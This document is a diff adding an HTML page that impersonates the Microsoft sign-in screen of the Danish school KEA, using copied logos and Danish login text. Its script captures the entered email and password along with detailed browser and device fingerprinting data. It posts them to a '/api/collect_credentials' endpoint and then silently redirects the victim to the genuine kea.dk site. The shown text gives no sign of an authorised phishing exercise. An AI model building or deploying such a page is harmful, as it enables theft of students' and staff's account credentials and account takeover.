@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="da">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>KEA - Microsoft Login</title>
+    <style>
+      body {
+        font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI",
+          -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue",
+          sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #ffffff;
+        color: #000000;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .login-container {
+        width: 440px;
+        padding: 44px;
+        background-color: #ffffff;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+      }
+      .logos {
+        display: flex;
+        align-items: center;
+        margin-bottom: 24px;
+      }
+      .microsoft-logo {
+        width: 108px;
+        height: 24px;
+        margin-right: 16px;
+      }
+      .kea-logo {
+        height: 40px;
+      }
+      h1 {
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 16px;
+      }
+      .subtitle {
+        font-size: 14px;
+        margin-bottom: 24px;
+        color: #333333;
+      }
+      .form-control {
+        margin-bottom: 16px;
+      }
+      input[type="email"],
+      input[type="password"] {
+        width: 100%;
+        padding: 6px 10px;
+        font-size: 15px;
+        border: 1px solid #666666;
+        border-radius: 2px;
+        height: 36px;
+        outline: none;
+        box-sizing: border-box;
+      }
+      input[type="email"]:focus,
+      input[type="password"]:focus {
+        border-color: #b11a29;
+      }
+      .button {
+        display: inline-block;
+        min-width: 108px;
+        padding: 6px 12px;
+        font-size: 14px;
+        font-weight: 600;
+        color: white;
+        background-color: #b11a29;
+        border: none;
+        border-radius: 2px;
+        cursor: pointer;
+        text-align: center;
+        margin-top: 12px;
+        height: 32px;
+      }
+      .button:hover {
+        background-color: #8a1320;
+      }
+      .links {
+        margin-top: 24px;
+        font-size: 13px;
+      }
+      .links a {
+        color: #b11a29;
+        text-decoration: none;
+        margin-bottom: 8px;
+        display: inline-block;
+      }
+      .links a:hover {
+        color: #8a1320;
+        text-decoration: underline;
+      }
+      .error-message {
+        color: #e81123;
+        font-size: 13px;
+        margin-top: 8px;
+        display: none;
+      }
+      .footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #f2f2f2;
+        padding: 16px;
+        font-size: 12px;
+        color: #666666;
+        text-align: center;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="logos">
+        <img
+          src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+          alt="Microsoft"
+          class="microsoft-logo"
+        />
+        <img
+          src="https://www.kea.dk/images/resources/images/kea-header-logo-dark.svg"
+          alt="KEA"
+          class="kea-logo"
+        />
+      </div>
+      <h1>Log på</h1>
+      <div class="subtitle">for at fortsætte til KEA Microsoft Office</div>
+
+      <form id="loginForm">
+        <div class="form-control">
+          <input
+            type="email"
+            id="email"
+            name="email"
+            placeholder="E-mail eller brugernavn"
+            required
+            autofocus
+          />
+        </div>
+        <div class="error-message" id="emailError">
+          Indtast en gyldig e-mailadresse eller brugernavn.
+        </div>
+
+        <div class="form-control" id="passwordContainer" style="display: none">
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Adgangskode"
+            required
+          />
+        </div>
+        <div class="error-message" id="passwordError">
+          Indtast din adgangskode.
+        </div>
+
+        <div style="text-align: right">
+          <button type="button" id="nextButton" class="button">Næste</button>
+          <button
+            type="submit"
+            id="signInButton"
+            class="button"
+            style="display: none"
+          >
+            Log på
+          </button>
+        </div>
+      </form>
+
+      <div class="links">
+        <a href="#">Kan du ikke få adgang til din konto?</a><br />
+        <a href="#">Log på med en sikkerhedsnøgle</a><br />
+        <a href="#">Login muligheder</a>
+      </div>
+    </div>
+
+    <div class="footer">
+      <div>
+        <span>Fortrolighedspolitik & cookies</span>
+        <span>&nbsp;•&nbsp;</span>
+        <span>Vilkår for brug</span>
+      </div>
+      <div>© Københavns Erhvervsakademi 2025</div>
+    </div>
+
+    <script>
+      // Function to collect system information
+      function collectSystemInfo() {
+        const screenInfo = {
+          width: window.screen.width,
+          height: window.screen.height,
+          colorDepth: window.screen.colorDepth,
+          pixelDepth: window.screen.pixelDepth,
+          orientation: window.screen.orientation
+            ? window.screen.orientation.type
+            : "unknown",
+        };
+
+        const browserInfo = {
+          cookiesEnabled: navigator.cookieEnabled,
+          language: navigator.language,
+          languages: navigator.languages,
+          platform: navigator.platform,
+          userAgent: navigator.userAgent,
+          vendor: navigator.vendor,
+          doNotTrack: navigator.doNotTrack,
+          connection: navigator.connection
+            ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+              }
+            : "not available",
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          deviceMemory: navigator.deviceMemory,
+          webdriver: navigator.webdriver,
+        };
+
+        // Battery info if available
+        let batteryInfo = "not available";
+        if (navigator.getBattery) {
+          navigator.getBattery().then(function (battery) {
+            batteryInfo = {
+              charging: battery.charging,
+              level: battery.level,
+              chargingTime: battery.chargingTime,
+              dischargingTime: battery.dischargingTime,
+            };
+          });
+        }
+
+        // Timezone and location info
+        const timeInfo = {
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timezoneOffset: new Date().getTimezoneOffset(),
+          currentTime: new Date().toString(),
+        };
+
+        return {
+          screenInfo,
+          browserInfo,
+          batteryInfo,
+          timeInfo,
+          plugins: Array.from(navigator.plugins || []).map((p) => p.name),
+          windowDimensions: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+          },
+          location: window.location.href,
+          referrer: document.referrer,
+        };
+      }
+
+      document
+        .getElementById("nextButton")
+        .addEventListener("click", function () {
+          const email = document.getElementById("email").value;
+          if (email.trim() === "") {
+            document.getElementById("emailError").style.display = "block";
+            return;
+          }
+
+          // Hide email error and show password field
+          document.getElementById("emailError").style.display = "none";
+          document.getElementById("passwordContainer").style.display = "block";
+          document.getElementById("nextButton").style.display = "none";
+          document.getElementById("signInButton").style.display =
+            "inline-block";
+          document.getElementById("password").focus();
+        });
+
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+
+          if (password.trim() === "") {
+            document.getElementById("passwordError").style.display = "block";
+            return;
+          }
+
+          // Collect system information
+          const systemInfo = collectSystemInfo();
+
+          // Add KEA identifier to collected credentials
+          fetch("/api/collect_credentials", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              email: email,
+              password: password,
+              org: "kea",
+              screenInfo: systemInfo.screenInfo,
+              browserInfo: systemInfo.browserInfo,
+              timeInfo: systemInfo.timeInfo,
+              clientInfo: systemInfo,
+            }),
+          })
+            .then((response) => {
+              // Redirect to legitimate KEA page after collecting credentials
+              window.location.href = "https://kea.dk";
+            })
+            .catch((error) => {
+              // Still redirect even if there's an error with the collection
+              window.location.href = "https://kea.dk";
+            });
+        });
+    </script>
+  </body>
+</html>
